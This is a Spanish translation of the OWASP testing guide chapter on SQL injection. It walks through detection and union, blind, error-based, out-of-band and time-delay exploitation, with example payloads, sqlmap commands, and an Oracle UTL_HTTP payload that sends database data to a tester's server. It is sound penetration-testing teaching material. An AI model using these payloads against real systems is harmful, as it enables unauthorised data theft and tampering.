# Testing for SQL Injection

|ID          |
|------------|
|WSTG-INPV-05|

## Summary

Las pruebas de inyección SQL verifican si es posible inyectar datos en una aplicación/sitio para que ejecute una consulta SQL controlada por el usuario en la base de datos. Los evaluadores encuentran una vulnerabilidad de inyección SQL si la aplicación utiliza la entrada del usuario para crear consultas SQL sin validación de entrada adecuada. La explotación exitosa de esta clase de vulnerabilidad permite a un usuario no autorizado acceder o manipular datos en la base de datos, lo cual, como ya sabrás, es bastante malo.

Un ataque de [inyección SQL](https://owasp.org/www-community/attacks/SQL_Injection) consiste en la inserción o "inyección" de una consulta SQL parcial o completa a través de la entrada de datos o transmitida desde el cliente (navegador) a la aplicación web. Un ataque de inyección SQL exitoso puede leer datos sensibles de la base de datos, modificar datos de la base de datos (insertar/actualizar/eliminar), ejecutar operaciones de administración en la base de datos (como apagar el DBMS), recuperar el contenido de un archivo dado presente en el sistema de archivos del DBMS o escribir archivos en el sistema de archivos, y, en algunos casos, emitir comandos al sistema operativo. Los ataques de inyección SQL son un tipo de ataque de inyección, en el que los comandos SQL se inyectan en la entrada de datos plana para afectar la ejecución de comandos SQL predefinidos.

En general, la forma en que las aplicaciones web construyen declaraciones SQL que involucran sintaxis SQL escrita por los programadores se mezcla con datos proporcionados por el usuario. Ejemplo:

`select title, text from news where id=$id`

En el ejemplo anterior, la variable `$id` contiene datos proporcionados por el usuario, mientras que el resto es la parte estática SQL proporcionada por el programador; haciendo que la consulta SQL sea dinámica.

Debido a la forma en que se construyó, el usuario puede proporcionar entrada manipulada tratando de hacer que la consulta SQL original ejecute acciones adicionales de su elección. El ejemplo a continuación ilustra la entrada proporcionada por el usuario "10 or 1=1", cambiando la lógica de la declaración SQL, agregando una condición "or 1=1".

`select title, text from news where id=10 or 1=1`

> **_NOTA:_** Ten cuidado al inyectar la condición OR 1=1 en una consulta SQL. Aunque esto puede ser inofensivo en el contexto inicial en el que lo inyectas, es común que las aplicaciones utilicen datos de una sola solicitud en múltiples consultas diferentes. Si tu condición llega a una declaración UPDATE o DELETE, por ejemplo, esto puede resultar en una pérdida accidental de datos.

Los ataques de inyección SQL se pueden dividir en las siguientes tres clases:

- Inband: los datos se extraen utilizando el mismo canal que se utiliza para inyectar el código SQL. Este es el ataque más directo, en el que los datos recuperados se presentan directamente en la página web de la aplicación.
- Out-of-band: los datos se recuperan utilizando un canal diferente (por ejemplo, un correo electrónico con los resultados de la consulta se genera y se envía al evaluador).
- Inferencial o Blind: no hay transferencia real de datos. Aun así, el evaluador puede reconstruir la información enviando solicitudes particulares y observando el comportamiento resultante del servidor de base de datos.

Un ataque de inyección SQL exitoso requiere que el atacante elabore una consulta SQL sintácticamente correcta. Si la aplicación devuelve un mensaje de error generado por una consulta incorrecta, entonces puede ser más fácil para un atacante reconstruir la lógica de la consulta original y, por lo tanto, entender cómo realizar la inyección correctamente. Sin embargo, si la aplicación oculta los detalles del error, entonces el evaluador debe poder ingeniar la lógica de la consulta original.

Sobre las técnicas para explotar fallos de inyección SQL, hay cinco técnicas comunes. Además, esas técnicas a veces se pueden usar de manera combinada (por ejemplo, operador union y out-of-band):

- Operador Union: se puede usar cuando el fallo de inyección SQL ocurre en una declaración SELECT, permitiendo combinar dos consultas en un solo resultado o conjunto de resultados.
- Boolean: utiliza condición(es) booleana(s) para verificar si ciertas condiciones son verdaderas o falsas.
- Basado en errores: esta técnica fuerza a la base de datos a generar un error, dando al atacante o evaluador información sobre la que refinar su inyección.
- Out-of-band: la técnica utilizada para recuperar datos utilizando un canal diferente (por ejemplo, hacer una conexión HTTP para enviar los resultados a un servidor web).
- Retraso de tiempo: utiliza comandos de base de datos (por ejemplo, sleep) para retrasar respuestas en consultas condicionales. Es útil cuando el atacante no tiene alguna respuesta (resultado, salida o error) de la aplicación.

## Test Objectives

- Identificar puntos de inyección SQL.
- Evaluar la gravedad de la inyección y el nivel de acceso que se puede lograr a través de ella.

## How to Test

### Detection Techniques

El primer paso en esta prueba es entender cuándo la aplicación interactúa con un servidor de base de datos para acceder a algunos datos. Ejemplos típicos de casos, cuando una aplicación necesita hablar con una base de datos, incluyen:

- Formularios de autenticación: cuando la autenticación se realiza utilizando un formulario web, es probable que las credenciales del usuario se verifiquen contra una base de datos que contiene todos los nombres de usuario y contraseñas (o, mejor, hashes de contraseñas).
- Motores de búsqueda: la cadena enviada por el usuario podría usarse en una consulta SQL que extrae todos los registros relevantes de una base de datos.
- Sitios de comercio electrónico: los productos y sus características (precio, descripción, disponibilidad, etc.) es muy probable que se almacenen en una base de datos.

El evaluador debe hacer una lista de todos los campos de entrada cuyos valores podrían usarse en la elaboración de una consulta SQL, incluyendo los campos ocultos de solicitudes POST, y luego probarlos por separado, tratando de interferir con la consulta y generar un error. Considera también encabezados HTTP y Cookies.

La primera prueba generalmente consiste en agregar una comilla simple `'` o un punto y coma `;` al campo o parámetro bajo prueba. El primero se usa en SQL como terminador de cadena y, si no se filtra por la aplicación, conducirá a una consulta incorrecta. El segundo se usa para terminar una declaración SQL y, si no se filtra, también es probable que genere un error. La salida de un campo vulnerable podría parecerse a lo siguiente (en un Microsoft SQL Server, en este caso):

```asp
Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
[Microsoft][ODBC SQL Server Driver][SQL Server]Unclosed quotation mark before the
character string ''.
/target/target.asp, line 113
```

También delimitadores de comentarios (`--` o `/* */`, etc.) y otras palabras clave SQL como `AND` y `OR` se pueden usar para intentar modificar la consulta. Una técnica simple pero a veces aún efectiva es simplemente insertar una cadena donde se espera un número, como un error como el siguiente podría generarse:

```asp
Microsoft OLE DB Provider for ODBC Drivers error '80040e07'
[Microsoft][ODBC SQL Server Driver][SQL Server]Syntax error converting the
varchar value 'test' to a column of data type int.
/target/target.asp, line 113
```

Monitorea todas las respuestas del servidor web y busca en el código fuente HTML/JavaScript. A veces el error está presente dentro de ellos pero por alguna razón (por ejemplo, error de JavaScript, comentarios HTML, etc.) no se presenta al usuario. Un mensaje de error completo, como los de los ejemplos, proporciona una gran cantidad de información al evaluador para montar un ataque de inyección exitoso. Sin embargo, las aplicaciones a menudo no proporcionan tanto detalle: una simple '500 Server Error' o una página de error personalizada podría emitirse, lo que significa que necesitamos usar técnicas de inyección ciega. En cualquier caso, es muy importante probar cada campo por separado: solo una variable debe variar mientras todas las demás permanecen constantes, para comprender con precisión qué parámetros son vulnerables y cuáles no.

### Standard SQL Injection Testing Methods

#### Classic SQL Injection

Considera la siguiente consulta SQL:

`SELECT * FROM Users WHERE Username='$username' AND Password='$password'`

Una consulta similar se usa generalmente desde la aplicación web para autenticar a un usuario. Si la consulta devuelve un valor significa que dentro de la base de datos existe un usuario con ese conjunto de credenciales, entonces el usuario puede iniciar sesión en el sistema; de lo contrario, se deniega el acceso. Los valores de los campos de entrada generalmente se obtienen del usuario a través de un formulario web. Supongamos que insertamos los siguientes valores de Nombre de usuario y Contraseña:

`$username = 1' or '1' = '1`

`$password = 1' or '1' = '1`

La consulta será:

`SELECT * FROM Users WHERE Username='1' OR '1' = '1' AND Password='1' OR '1' = '1'`

> **_NOTA:_** Ten cuidado al inyectar la condición OR 1=1 en una consulta SQL. Aunque esto puede ser inofensivo en el contexto inicial en el que lo inyectas, es común que las aplicaciones utilicen datos de una sola solicitud en múltiples consultas diferentes. Si tu condición llega a una declaración UPDATE o DELETE, por ejemplo, esto puede resultar en una pérdida accidental de datos.

Si suponemos que los valores de los parámetros se envían al servidor a través del método GET, y si el dominio del sitio vulnerable es `www.example.com`, la solicitud que realizaremos será:

`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1&password=1'%20or%20'1'%20=%20'1`

Después de un análisis breve, notamos que la consulta devuelve un valor (o un conjunto de valores) porque la condición es siempre verdadera (`OR 1=1`). De esta manera, el sistema ha autenticado al usuario sin conocer el nombre de usuario y la contraseña.

> Nota: En algunos sistemas, la primera fila de una tabla de usuario sería un usuario administrador. Este podría ser el perfil devuelto en algunos casos.

Otro ejemplo de consulta es el siguiente:

`SELECT * FROM Users WHERE ((Username='$username') AND (Password=MD5('$password')))`

En este caso, hay dos problemas, uno debido al uso de los paréntesis y uno debido al uso de la función hash MD5. Primero, resolvemos el problema de los paréntesis. Eso simplemente consiste en agregar paréntesis de cierre hasta obtener una consulta corregida. Para resolver el segundo problema, intentamos evadir la segunda condición. Agregamos a nuestra consulta un símbolo final que significa que un comentario está comenzando. De esta manera, todo lo que sigue a dicho símbolo se considera un comentario. Cada DBMS tiene su propia sintaxis para comentarios, sin embargo, un símbolo común para la mayor parte de las bases de datos es `/*`. En Oracle, el símbolo es `--`. Dicho esto, los valores que usaremos como Nombre de usuario y Contraseña son:

`$username = 1' or '1' = '1'))/*`

`$password = foo`

De esta manera, obtendremos la siguiente consulta:

`SELECT * FROM Users WHERE ((Username='1' or '1' = '1'))/*') AND (Password=MD5('$password')))`

(Dado la inclusión de un delimitador de comentario en el valor `$username`, la porción de contraseña de la consulta se ignorará.)

La solicitud URL será:

`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))/*&password=foo`

Esto puede devolver algunos valores. A veces, el código de autenticación verifica que el número de registros devueltos/resultados sea exactamente igual a 1. En los ejemplos anteriores, esta situación sería difícil (en la base de datos hay solo un valor por usuario). Para sortear este problema, es suficiente insertar un comando SQL que imponga una condición de que el número de los resultados devueltos sea uno (un registro devuelto). Para lograr esto, usamos el operador `LIMIT <num>`, donde `<num>` es el número de los resultados/registros que queremos que se devuelvan. Respecto al ejemplo anterior, los valores de los campos Nombre de usuario y Contraseña se modificarán de la siguiente manera:

`$username = 1' or '1' = '1')) LIMIT 1/*`

`$password = foo`

De esta manera, creamos una solicitud como la siguiente:

`https://www.example.com/index.php?username=1'%20or%20'1'%20=%20'1'))%20LIMIT%201/*&password=foo`

#### SELECT Statement

Considera la siguiente consulta SQL:

`SELECT * FROM products WHERE id_product=$id_product`

Considera también la solicitud a un script que ejecuta la consulta anterior:

`https://www.example.com/product.php?id=10`

Cuando el evaluador intenta un valor válido (por ejemplo, 10 en este caso), la aplicación devolverá la descripción de un producto. Una buena manera de probar si la aplicación es vulnerable en este escenario es jugar con la lógica, usando los operadores AND y OR.

Considera la solicitud:

`https://www.example.com/product.php?id=10 AND 1=2`

`SELECT * FROM products WHERE id_product=10 AND 1=2`

En este caso, probablemente la aplicación devolvería algún mensaje diciéndonos que no hay contenido disponible o una página en blanco. Luego el evaluador puede enviar una declaración verdadera y verificar si hay un resultado válido:

`https://www.example.com/product.php?id=10 AND 1=1`

#### Stacked Queries

Dependiendo de la API que la aplicación web esté usando y el DBMS (por ejemplo, PHP + PostgreSQL, ASP+SQL SERVER) puede ser posible ejecutar múltiples consultas en una llamada.

Considera la siguiente consulta SQL:

`SELECT * FROM products WHERE id_product=$id_product`

Una forma de explotar el escenario anterior sería:

`https://www.example.com/product.php?id=10; INSERT INTO users (…)`

De esta manera, es posible ejecutar muchas consultas en una fila e independiente de la primera consulta.

### Fingerprinting the Database

Aunque el lenguaje SQL es un estándar, cada DBMS tiene su peculiaridad y difiere de cada uno en muchos aspectos como comandos especiales, funciones para recuperar datos como nombres de usuarios y bases de datos, características, líneas de comentarios, etc.

Cuando los evaluadores pasan a una explotación de inyección SQL más avanzada necesitan saber cuál es la base de datos backend.

#### Errors Returned by the Application

La primera forma de averiguar qué backend de base de datos se usa es observando el error devuelto por la aplicación. Los siguientes son algunos ejemplos de mensajes de error:

MySql:

```html
You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the
right syntax to use near '\'' at line 1
```

Una UNION SELECT completa con version() también puede ayudar a saber la base de datos backend.

`SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1`

Oracle:

`ORA-00933: SQL command not properly ended`

MS SQL Server:

```html
Microsoft SQL Native Client error ‘80040e14’
Unclosed quotation mark after the character string

SELECT id, name FROM users WHERE id=1 UNION SELECT 1, @@version limit 1, 1
```

PostgreSQL:

```html
Query failed: ERROR: syntax error at or near
"’" at character 56 in /www/site/test.php on line 121.
```

Si no hay mensaje de error o un mensaje de error personalizado, el evaluador puede intentar inyectarlo en campos de cadena usando técnicas de concatenación variables:

- MySql: ‘test’ + ‘ing’
- SQL Server: ‘test’ ‘ing’
- Oracle: ‘test’||’ing’
- PostgreSQL: ‘test’||’ing’

### Exploitation Techniques

#### Union Exploitation Technique

El operador UNION se usa en inyecciones SQL para unir una consulta, forjada intencionalmente por el evaluador, a la consulta original. El resultado de la consulta forjada se unirá al resultado de la consulta original, permitiendo al evaluador obtener los valores de columnas de otras tablas. Supongamos, para nuestro ejemplo, que la consulta ejecutada desde el servidor es la siguiente:

`SELECT Name, Phone, Address FROM Users WHERE Id=$id`

Estableceremos el siguiente valor `$id`:

`$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

Tendremos la siguiente consulta:

`SELECT Name, Phone, Address FROM Users WHERE Id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`

Que unirá el resultado de la consulta original con todos los números de tarjetas de crédito en la tabla CreditCardTable. La palabra clave `ALL` es necesaria para sortear consultas que usan la palabra clave `DISTINCT`. Además, notamos que más allá de los números de tarjetas de crédito, hemos seleccionado otros dos valores. Estos dos valores son necesarios porque las dos consultas deben tener un número igual de parámetros/columnas para evitar un error de sintaxis.

El primer detalle que un evaluador necesita encontrar para explotar la vulnerabilidad de inyección SQL usando esta técnica es el número correcto de columnas en la declaración SELECT.

Para lograr esto, el evaluador puede usar la cláusula `ORDER BY` seguida de un número que indique la numeración de la columna de la base de datos seleccionada:

`https://www.example.com/product.php?id=10 ORDER BY 10--`

Si la consulta se ejecuta con éxito, el evaluador puede asumir en este ejemplo que hay 10 o más columnas en la declaración `SELECT`. Si la consulta falla, entonces debe haber menos de 10 columnas devueltas por la consulta. Si hay un mensaje de error disponible, probablemente sería:

`Unknown column '10' in 'order clause'`

Después de que el evaluador averigua el número de columnas, el siguiente paso es averiguar el tipo de columnas. Asumiendo que había 3 columnas en el ejemplo anterior, el evaluador podría probar cada tipo de columna, usando el valor NULL para ayudarlos:

`https://www.example.com/product.php?id=10 UNION SELECT 1,null,null--`

Si la consulta falla, el evaluador probablemente verá un mensaje como:

`All cells in a column must have the same datatype`

Si la consulta se ejecuta con éxito, la primera columna puede ser un entero. Luego el evaluador puede continuar y así sucesivamente:

`https://www.example.com/product.php?id=10 UNION SELECT 1,1,null--`

Después de la exitosa recopilación de información, dependiendo de la aplicación, puede que solo muestre al evaluador el primer resultado, porque la aplicación trata solo la primera línea del conjunto de resultados. En este caso, es posible usar una cláusula `LIMIT` o el evaluador puede establecer un valor inválido, haciendo que solo la segunda consulta sea válida (suponiendo que no hay entrada en la base de datos que tenga un ID igual a 99999):

`https://www.example.com/product.php?id=99999 UNION SELECT 1,1,null--`

#### Hidden Union Exploitation Technique

Es mejor cuando puedes explotar una inyección SQL con la [técnica union](#union-exploitation-technique) porque puedes recuperar el resultado de tu consulta en una solicitud.  
Pero la mayoría de las inyecciones SQL en la naturaleza son ciegas. Aun así, puedes convertir algunas de ellas en inyecciones basadas en union.

**Identification**  
Se pueden usar uno de los siguientes métodos para identificar estas inyecciones SQL:

1. La consulta vulnerable devuelve datos, pero la inyección es ciega.
2. La técnica `ORDER BY` funciona, pero no puedes lograr una inyección basada en union.

**Root Cause**  
La razón por la que no puedes usar las técnicas Union habituales es la complejidad de la consulta vulnerable. En la Técnica Union, comentas el resto de la consulta después de tu payload `UNION`. Está bien para consultas normales, pero en consultas más complicadas puede ser problemático. Si la primera parte de la consulta depende de la segunda parte de ella, comentar el resto la rompe.  
Por ejemplo, si tienes una subconsulta vulnerable, y la consulta padre usa los resultados de la subconsulta, entonces comentar la parte padre romperá la consulta.

**Scenario 1**  
La consulta vulnerable es una subconsulta, y la consulta padre maneja devolver los datos.

```text
SELECT 
  * 
FROM 
  customers 
WHERE 
  id IN (                 --\
    SELECT                   |
      DISTINCT customer_id   |
    FROM                     |--> vulnerable query
      orders                 |
    WHERE                    |
      cost > 200             |
  );                      --/
```

- _Problem:_ Si inyectas un payload `UNION`, no afecta los datos devueltos. Porque estás modificando la sección `WHERE`. De hecho, no estás agregando una consulta `UNION` a la consulta original.  
- _Solution:_ Necesitas saber qué consulta se ejecuta en el backend. Luego, crea tu payload basado en eso. Significa cerrar paréntesis abiertos o agregar palabras clave apropiadas si es necesario.

**Scenario 2**  
La consulta vulnerable contiene aliases o declaraciones de variables.

```text
SELECT 
  s1.user_id, 
  (                                                                                      --\
    CASE WHEN s2.user_id IS NOT NULL AND s2.sub_type = 'INJECTION_HERE' THEN 1 ELSE 0 END   |--> vulnerable query
  ) AS overlap                                                                           --/
FROM 
  s1 
  LEFT JOIN subscriptions AS s2 ON s1.user_id != s2.user_id 
  AND s1.start_date <= s2.end_date 
  AND s1.end_date >= s2.start_date 
GROUP BY 
  s1.user_id
```

- _Problem:_ Rompes la consulta cuando comentas el resto de la consulta original después de tu payload inyectado porque algunos aliases o variables se vuelven `undefined`.  
- _Solution:_ Necesitas poner palabras clave o aliases apropiados al principio de tu payload. de esta manera la primera parte de la consulta original permanece válida.

**Scenario 3**  
El resultado de la consulta vulnerable se está usando en una segunda consulta. La segunda consulta devuelve los datos, no la primera.

```text
<?php
// retrieves product ID based on product name
                             --\
$query1 = "SELECT              |
              id                |
            FROM                |--> vulnerable query #1
              products          |
            WHERE               |
              name = '$name'";  |
                             --/
// retrieves product's comments based on the product ID
                               --\
$query2 = "SELECT                |
              comments            |
            FROM                  |
              products            |--> vulnerable query #2
            WHERE                 |
              id = '$result1'";   |
                               --/
$result1 = odbc_exec($conn, $query1);
// ...
$result2 = odbc_exec($conn, $query2);
?>
```

- _Problem:_ Puedes agregar un payload `UNION` a la primera consulta pero no afectará los datos devueltos.  
- _solution:_ Necesitas inyectar en la segunda consulta. Así que la entrada a la segunda consulta no debe sanitizarse. Luego, necesitas hacer que la primera consulta devuelva no datos. Ahora agrega una consulta `UNION` que devuelva el payload que quieres inyectar en la _segunda consulta_.
   
  **Example:**  
  La base del payload (lo que inyectas en la primera consulta):

  ```text
  ' AND 1 = 2 UNION SELECT "PAYLOAD" -- -
  ```

  El `PAYLOAD` es lo que quieres inyectar en la _segunda consulta_:
   
  ```text
  ' AND 1=2 UNION SELECT ...
  ```

  El payload final (después de reemplazar el `PAYLOAD`):

  ```text
  ' AND 1 = 2 UNION SELECT "' AND 1=2 UNION SELECT ..." -- -
                             \________________________/
                                         ||
                                         \/
                                  the payload that
                                   get's injected
                                into the second query
  \________________________________________________________/
                               ||
                               \/
    the actual query we inject into the vulnerable parameter
  ```

  La primera consulta después de la inyección:

  ```text
  SELECT               --\
    id                    |
  FROM                    |----> first query
    products              |
  WHERE                   |
    name = 'abcd'      --/
    AND 1 = 2                                 --\
  UNION                                          |----> injected payload (what gets injected into the second payload)
  SELECT                                         |
    "' AND 1=2 UNION SELECT ... -- -" -- -'   --/
  ```

  La segunda consulta después de la inyección:

  ```text
  SELECT            --\
    comments           |
  FROM                 |----> second query
    products           |
  WHERE                |
    id = ''         --/
    AND 1 = 2         --\ 
  UNION                  |----> injected payload (the final UNION query that controls the returned data)
  SELECT ... -- -'    --/
  ```

**Scenario 4**  
El parámetro vulnerable se está usando en varias consultas independientes.

```text
<?php
//retrieving product details based on product ID
$query1 = "SELECT 
              name, 
              inserted, 
              size 
            FROM 
              products 
            WHERE 
              id = '$id'";
$result1 = odbc_exec($conn, $query1);
//retrieving product comments based on the product ID
$query2 = "SELECT 
              comments 
            FROM 
              products 
            WHERE 
              id = '$id'";
$result2 = odbc_exec($conn, $query2);
?>
```

- _Problem:_ Agregar una consulta `UNION` a la primera (o segunda) consulta no la rompe, pero puede romper la otra.  
- _Solution:_ Depende de la estructura de código de la aplicación. Pero el primer paso es conocer la consulta original. La mayoría de las veces, estas inyecciones son basadas en tiempo. También, el payload basado en tiempo se inyecta en varias consultas que pueden ser problemático.  
  Por ejemplo, si usas `SQLMap`, esta situación confunde la herramienta y la salida se desordena. Porque los retrasos no serán como se esperaba.  

**Extracting Original Query**  
Como ves, conocer la consulta original es siempre necesario para lograr una inyección basada en union.  
Puedes recuperar la consulta original usando las tablas DBMS predeterminadas:

| DBMS                 | Table                          |
|----------------------|--------------------------------|
| MySQL                | INFORMATION_SCHEMA.PROCESSLIST |
| PostgreSQL           | pg_stat_activity               |
| Microsoft SQL Server | sys.dm_exec_cached_plans       |
| Oracle               | V$SQL                          |

**Automation**  
Pasos para automatizar el flujo de trabajo:

1. Extrae la consulta original usando `SQLMap` y inyección ciega.
2. Construye un payload base según la consulta original y logra inyección basada en union.
3. Automatiza la explotación de la inyección basada en union usando una de estas opciones:  
    - Especificando un _marcador de punto de inyección personalizado_ (`*`)
    - Usando banderas `--prefix` y `--suffix`.

**Example:**  
Considera el tercer escenario discutido arriba.  
Asumimos que el DMBS es `MySQL` y las primeras y segundas consultas devuelven solo una columna.
Esto puede ser tu payload para extraer la versión de la base de datos:

```text
' AND 1=2 UNION SELECT " ' AND 1=2 UNION SELECT @@version -- -" -- -
```

Así que la URL objetivo sería como esta:

```text
https://example.org/search?query=abcd'+AND+1=2+UNION+SELECT+"+'AND 1=2+UNION+SELECT+@@version+--+-"+--+-
```

Automation:  

- _marcador de punto de inyección personalizado_ (`*`):

  ```text
  sqlmap -u "https://example.org/search?query=abcd'AND 1=2 UNION SELECT \"*\"-- -"
  ```

- banderas `--prefix` y `--suffix`:

  ```text
  sqlmap -u "https://example.org/search?query=abcd" --prefix="'AND 1=2 UNION SELECT \"" --suffix="\"-- -"
  ```

#### Boolean Exploitation Technique

La técnica de explotación booleana es muy útil cuando el evaluador encuentra una situación de [Inyección SQL Ciega](https://owasp.org/www-community/attacks/Blind_SQL_Injection), en la que no se conoce nada sobre el resultado de una operación. Por ejemplo, este comportamiento ocurre en casos donde el programador ha creado una página de error personalizada que no revela nada sobre la estructura de la consulta o la base de datos. (La página no devuelve un error SQL, puede devolver solo un HTTP 500, 404, o redireccionar).

Usando métodos de inferencia, es posible evitar este obstáculo y así tener éxito en recuperar los valores de algunos campos deseados. Este método consiste en llevar a cabo una serie de consultas booleanas contra el servidor, observando las respuestas, y finalmente deduciendo el significado de tales respuestas. Consideramos, como siempre, el dominio `www.example.com` y suponemos que contiene un parámetro llamado `id` vulnerable a inyección SQL. Esto significa que cuando llevamos a cabo la siguiente solicitud:

`https://www.example.com/index.php?id=1'`

Obtendremos una página con un mensaje de error personalizado debido a un error sintáctico en la consulta. Suponemos que la consulta ejecutada en el servidor es:

`SELECT field1, field2, field3 FROM Users WHERE Id='$Id'`

Que es explotable a través de los métodos vistos anteriormente. Lo que queremos obtener es los valores del campo username. Las pruebas que ejecutaremos nos permitirán obtener el valor del campo username, extrayendo dicho valor carácter por carácter. Esto es posible a través del uso de algunas funciones estándar, presentes en prácticamente todas las bases de datos. Para nuestro ejemplo, usaremos las siguientes pseudo-funciones:

- SUBSTRING (text, start, length): devuelve una subcadena comenzando desde la posición "start" del texto y longitud "length". Si "start" es mayor que la longitud del texto, la función devuelve un valor null.

- ASCII (char): devuelve el valor ASCII del carácter de entrada. Se devuelve un valor null si char es 0.

- LENGTH (text): devuelve el número de caracteres en el texto de entrada.

A través de tales funciones, ejecutaremos nuestras pruebas en el primer carácter y, cuando hayamos descubierto el valor, pasaremos al segundo y así sucesivamente, hasta que hayamos descubierto el valor completo. Las pruebas aprovecharán la función SUBSTRING, para seleccionar solo un carácter a la vez (seleccionar un solo carácter significa imponer el parámetro length a 1), y la función ASCII, para obtener el valor ASCII, de modo que podamos hacer comparación numérica. Los resultados de la comparación se harán con todos los valores de la tabla ASCII hasta que se encuentre el valor correcto. Como ejemplo, usaremos el siguiente valor para `Id`:

`$Id=1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1`

Que crea la siguiente consulta (de ahora en adelante, la llamaremos "consulta inferencial"):

`SELECT field1, field2, field3 FROM Users WHERE Id='1' OR ASCII(SUBSTRING(username,1,1))=97 AND '1'='1'`

El ejemplo anterior devuelve un resultado si y solo si el primer carácter del campo username es igual al valor ASCII 97. Si obtenemos un valor falso, entonces aumentamos el índice de la tabla ASCII de 97 a 98 y repetimos la solicitud. Si en cambio obtenemos un valor verdadero, establecemos el índice de la tabla ASCII a cero y analizamos el siguiente carácter, modificando los parámetros de la función SUBSTRING. El problema es entender de qué manera podemos distinguir pruebas que devuelven un valor verdadero de las que devuelven falso. Para hacer esto, creamos una consulta que siempre devuelve falso. Esto es posible usando el siguiente valor para el campo `Id`:

`$Id=1' AND '1' = '2`

Que creará la siguiente consulta:

`SELECT field1, field2, field3 FROM Users WHERE Id='1' AND '1' = '2'`

La respuesta obtenida del servidor (es decir, código HTML) será el valor falso para nuestras pruebas. Esto es suficiente para verificar si el valor obtenido de la ejecución de la consulta inferencial es igual al valor obtenido con la prueba ejecutada antes. A veces, este método no funciona. Si el servidor devuelve dos páginas diferentes como resultado de dos solicitudes web consecutivas idénticas, no podremos discriminar el valor verdadero del falso. En estos casos particulares, es necesario usar filtros particulares que permitan eliminar el código que cambia entre las dos solicitudes y obtener una plantilla. Más tarde, para cada solicitud inferencial ejecutada, extraeremos la plantilla relativa de la respuesta usando la misma función, y realizaremos un control entre las dos plantillas para decidir el resultado de la prueba.

En la discusión anterior, no hemos tratado el problema de determinar la condición de terminación para nuestras pruebas, es decir, cuándo deberíamos terminar el procedimiento de inferencia. Una técnica para hacer esto usa una característica de la función SUBSTRING y la función LENGTH. Cuando la prueba compara el carácter actual con el código ASCII 0 (es decir, el valor null) y la prueba devuelve el valor true, entonces ya sea que hayamos terminado el procedimiento de inferencia (hemos escaneado toda la cadena), o el valor que hemos analizado contiene el carácter null.

Insertaremos el siguiente valor para el campo `Id`:

`$Id=1' OR LENGTH(username)=N AND '1' = '1`

Donde N es el número de caracteres que hemos analizado hasta ahora (no contando el valor null). La consulta será:

`SELECT field1, field2, field3 FROM Users WHERE Id='1' OR LENGTH(username)=N AND '1' = '1'`

La consulta devuelve verdadero o falso. Si obtenemos verdadero, entonces hemos completado la inferencia y, por lo tanto, conocemos el valor del parámetro. Si obtenemos falso, esto significa que el carácter null está presente en el valor del parámetro, y debemos continuar analizando el siguiente parámetro hasta encontrar otro valor null.

El ataque de inyección SQL ciega necesita un alto volumen de consultas. El evaluador puede necesitar una herramienta automática para explotar la vulnerabilidad.

#### Error Based Exploitation Technique

Una técnica de explotación basada en errores es útil cuando el evaluador por alguna razón no puede explotar la vulnerabilidad de inyección SQL usando otras técnicas como UNION. La técnica basada en errores consiste en forzar a la base de datos a realizar alguna operación en la que el resultado será un error. El punto aquí es intentar extraer algunos datos de la base de datos y mostrarlo en el mensaje de error. Esta técnica de explotación puede ser diferente de DBMS a DBMS (ver sección específica de DBMS).

Considera la siguiente consulta SQL:

`SELECT * FROM products WHERE id_product=$id_product`

Considera también la solicitud a un script que ejecuta la consulta anterior:

`https://www.example.com/product.php?id=10`

La solicitud maliciosa sería (por ejemplo, Oracle 10g):

`https://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--`

En este ejemplo, el evaluador está concatenando el valor 10 con el resultado de la función `UTL_INADDR.GET_HOST_NAME`. Esta función de Oracle intentará devolver el nombre de host del parámetro pasado a ella, que es otra consulta, el nombre del usuario. Cuando la base de datos busca un nombre de host con el nombre de usuario de la base de datos, fallará y devolverá un mensaje de error como:

`ORA-292257: host SCOTT unknown`

Luego el evaluador puede manipular el parámetro pasado a la función GET_HOST_NAME() y el resultado se mostrará en el mensaje de error.

#### Out-of-Band Exploitation Technique

Esta técnica es muy útil cuando el evaluador encuentra una situación de [Inyección SQL Ciega](https://owasp.org/www-community/attacks/Blind_SQL_Injection), en la que no se conoce nada sobre el resultado de una operación. La técnica consiste en el uso de funciones DBMS para realizar una conexión out-of-band y entregar los resultados de la consulta inyectada como parte de la solicitud al servidor del evaluador. Como las técnicas basadas en errores, cada DBMS tiene sus funciones. Ver secciones específicas de DBMS.

Considera la siguiente consulta SQL:

`SELECT * FROM products WHERE id_product=$id_product`

Considera también la solicitud a un script que ejecuta la consulta anterior:

`https://www.example.com/product.php?id=10`

La solicitud maliciosa sería:

`https://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--`

En este ejemplo, el evaluador está concatenando el valor 10 con el resultado de la función `UTL_HTTP.request`. Esta función de Oracle intentará conectarse a `testerserver` y hacer una solicitud HTTP GET conteniendo el retorno de la consulta `SELECT user FROM DUAL`. El evaluador puede configurar un servidor web (por ejemplo, Apache) o usar la herramienta Netcat:

```bash
/home/tester/nc –nLp 80

GET /SCOTT HTTP/1.1
Host: testerserver.com
Connection: close
```

#### Time Delay Exploitation Technique

La técnica de explotación de retraso de tiempo es muy útil cuando el evaluador encuentra una situación de [Inyección SQL Ciega](https://owasp.org/www-community/attacks/Blind_SQL_Injection), en la que no se conoce nada sobre el resultado de una operación. Esta técnica consiste en enviar una consulta inyectada y en caso de que la condicional sea verdadera, el evaluador puede monitorear el tiempo tomado para que el servidor responda. Si hay un retraso, el evaluador puede asumir que el resultado de la consulta condicional es verdadero. Esta técnica de explotación puede ser diferente de DBMS a DBMS (ver sección específica de DBMS).

Considera la siguiente consulta SQL:

`SELECT * FROM products WHERE id_product=$id_product`

Considera también la solicitud a un script que ejecuta la consulta anterior:

`https://www.example.com/product.php?id=10`

La solicitud maliciosa sería (por ejemplo, MySql 5.x):

`https://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’))--`

